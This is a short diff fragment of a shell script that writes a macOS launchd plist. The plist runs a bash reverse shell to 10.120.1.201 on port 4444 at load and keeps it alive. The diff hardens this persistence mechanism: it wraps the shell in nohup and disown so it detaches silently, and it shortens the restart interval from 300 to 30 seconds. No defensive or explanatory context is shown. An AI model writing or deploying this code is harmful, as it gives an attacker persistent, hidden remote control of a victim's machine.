@@ -17,14 +17,14 @@ cat <<'PLIST' > "$PLIST_PATH"
   <array>
     <string>/bin/bash</string>
     <string>-c</string>
-    <string>bash -i >& /dev/tcp/10.120.1.201/4444 0>&1</string>
+    <string>nohup bash -c "bash -i >& /dev/tcp/10.120.1.201/4444 0>&1" > /dev/null 2>&1 & disown</string>
   </array>
 
   <key>RunAtLoad</key>
   <true/>
 
   <key>StartInterval</key>
-  <integer>300</integer>
+  <integer>30</integer>
 
   <key>KeepAlive</key>
   <true/>
